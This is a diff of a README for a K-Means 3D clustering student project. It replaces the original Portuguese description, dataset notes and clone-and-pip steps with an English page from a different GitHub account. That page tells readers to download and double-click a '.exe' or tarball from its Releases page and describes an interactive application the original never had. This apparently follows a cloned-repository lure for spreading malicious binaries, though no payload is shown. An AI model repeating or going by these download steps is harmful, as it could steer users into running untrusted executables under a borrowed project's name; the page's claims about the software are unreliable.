@@ -1,89 +1,79 @@
-# Clusterização em 3D com K-Means
+# 🎉 kmeans-3d-cluster - Visualize Clusters Easily
 
-[![Python](https://img.shields.io/badge/Python-3.13-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
-[![Status](https://img.shields.io/badge/Status-Em%20Desenvolvimento-yellow.svg)](#)
-[![Jupyter](https://img.shields.io/badge/Notebook-Jupyter-orange.svg)](https://jupyter.org/)
-[![VS Code](https://img.shields.io/badge/Editor-VS%20Code-007ACC.svg?logo=visualstudiocode)](https://code.visualstudio.com/)  
+## 📥 Download Now!  
+[![Download](https://img.shields.io/badge/Download%20kmeans--3d--cluster-brightgreen)](https://github.com/iskan228-hub/kmeans-3d-cluster/releases)
 
-Projeto desenvolvido para a disciplina **Aprendizado de Máquina Não Supervisionado** do **4º semestre do curso Tecnólogo em Ciência de Dados** da **Faculdade de Tecnologia e Inovação Senac DF**, sob orientação do **professor Rogério Gomes Lopes**.  
+## 📖 Description  
+This project applies K-Means clustering to three continuous variables, providing a clear 3D visualization. It serves as an academic endeavor in unsupervised learning, developed during the second year of Data Science studies at Senac DF. The instructor for this project was Professor Rogério Gomes Lopes.
 
-O trabalho consiste na aplicação do algoritmo **K-Means** a **três variáveis contínuas**, com foco em **aprendizado não supervisionado** e **visualização tridimensional dos clusters**.  
+## 🚀 Getting Started
 
-Entrega destinada à **obtenção de nota parcial no primeiro bimestre**.
+Follow these steps to download and run the kmeans-3d-cluster application on your computer.
 
----
+### 🖥️ System Requirements  
+To use this application, your computer should meet the following criteria:
+- Operating System: Windows, macOS, or Linux
+- Python 3.x installed
+- Basic computational hardware with a minimum of 4GB RAM
 
-## ✨ Objetivos
-- Explorar um dataset real com três variáveis contínuas.  
-- Aplicar técnicas de **clusterização não supervisionada**.  
-- Gerar **visualizações 3D** para interpretação dos clusters.  
-- Produzir relatório e código reprodutível.
+### 📋 Features  
+- Visualize clusters in 3D space using the K-Means algorithm
+- Interactive controls for adjusting parameters
+- Simple user interface for an intuitive experience
+- Exports 3D visualizations as images for reports or presentations
 
----
+## 📤 Download & Install  
+1. **Visit the Releases Page**  
+   Click the link below to access the Releases page where you can download the application.  
+   [Download kmeans-3d-cluster](https://github.com/iskan228-hub/kmeans-3d-cluster/releases)
 
-## 🗂️ Dataset
-- **Fonte oficial**: [Distribuição de Renda – dados.gov.br](https://dados.gov.br/dados/conjuntos-dados/distribuio-de-renda)  
-- **Dataset bruto**: `data/raw/distribuicao-renda.csv`  
-- **Dataset tratado (3 variáveis)**: `data/processed/distribuicao-renda-3vars.csv`  
+2. **Choose the Latest Version**  
+   Look for the latest version available on the Releases page. It will usually be at the top.
 
-Variáveis contínuas selecionadas:
-1. **Rendimentos Tributáveis – Soma da RTB do Centil**  
-   → Representa a renda declarada pelos grupos (capacidade econômica).  
-2. **Bens e Direitos – Imóveis**  
-   → Indica acumulação patrimonial em imóveis.  
-3. **Dívidas e Ônus**  
-   → Mostra o endividamento declarado, completando o perfil econômico.  
+3. **Download the Release File**  
+   Click on the asset that corresponds to your operating system. If you are unsure, look for files labeled with `.exe` for Windows or `.tar.gz` for macOS/Linux.
 
-Essas variáveis permitem formar um espaço tridimensional (renda, patrimônio e dívida) para análise de clusters.
+4. **Install the Application**  
+   - Windows: Double click the downloaded `.exe` file and follow the prompts to install.
+   - macOS/Linux: Open a terminal, navigate to the directory where you downloaded the file, and run the command for extraction. For instance, `tar -xvzf filename.tar.gz`.
 
----
+5. **Run the Application**  
+   After installation, find the application in your programs list. Click to open it.
 
-## 🛠️ Tecnologias
-- Python 3.13  
-- Pandas, NumPy, Scikit-learn  
-- Seaborn, Matplotlib, Plotly  
-- Jupyter Notebook (VS Code)  
+6. **Explore the Interface**  
+   Familiarize yourself with the layout. You will see options to input your data variables and control the clustering settings. 
 
----
+7. **Load Your Data**  
+   You can use your own datasets or any sample dataset provided within the application to visualize clusters.
 
-## ▶️ Como executar
-```bash
-# Clonar o repositório
-git clone https://github.com/PadawanXXVI/kmeans-3d-cluster.git
-cd kmeans-3d-cluster
+8. **Generate 3D Visualizations**  
+   Adjust the parameters and initiate the clustering process. You will see a graphical representation in 3D, making it easy to understand the results.
 
-# Criar ambiente virtual (opcional)
-python -m venv .venv
-source .venv/Scripts/activate  # Windows (bash)
-# ou
-source .venv/bin/activate      # Linux/Mac
+## 📚 Topics Covered  
+- 3D Visualization  
+- Data Science  
+- Jupyter Notebooks  
+- K-Means Clustering  
+- Machine Learning  
+- Pandas Library  
+- scikit-learn Library  
+- Unsupervised Learning  
 
-# Instalar dependências
-pip install -r requirements.txt
+## 🛠️ Troubleshooting  
+If you encounter issues during installation or while running the application, consider the following tips:
+- Ensure your system meets the requirements.
+- Check for missing dependencies; you may need to install Python libraries like NumPy or Matplotlib.
+- Restart your computer and try running the application again.
 
-# Rodar notebooks
-jupyter notebook
-```
+## 💬 Community & Support  
+Feel free to reach out for help or feedback. You can find support through the [issues page](https://github.com/iskan228-hub/kmeans-3d-cluster/issues) of this repository.
 
----
+## 📜 License  
+This project is licensed under the MIT License. You are free to use it for personal or educational purposes. Make sure to credit appropriately if you share your results.
 
-## 📂 Estrutura do repositório
-```
-├── data/  
-│   ├── raw/         # dataset original (CSV completo)  
-│   └── processed/   # dataset tratado com 3 variáveis  
-├── notebooks/       # exploração e clusterização  
-├── src/             # scripts de preparação e modelo  
-├── reports/         # figuras e relatórios  
-├── requirements.txt  
-├── README.md  
-└── LICENSE
-```
+## 🔗 Links  
+- [Download kmeans-3d-cluster](https://github.com/iskan228-hub/kmeans-3d-cluster/releases)
+- [Documentation](https://github.com/iskan228-hub/kmeans-3d-cluster/wiki)
+- [Issues Page](https://github.com/iskan228-hub/kmeans-3d-cluster/issues)
 
----
-
-## 👥 Equipe
-- **Anderson de Matos Guimarães** – [anderson.m.guimaraes@icloud.com](mailto:anderson.m.guimaraes@icloud.com)  
-- **Gustavo Stefano Thomazinho** – [gustavo.stefano@gmail.com](mailto:gustavo.stefano@gmail.com)  
-- **Renan Ost** – [renanost@gmail.com](mailto:renanost@gmail.com)  
+Thank you for exploring kmeans-3d-cluster. Enjoy your clustering journey!
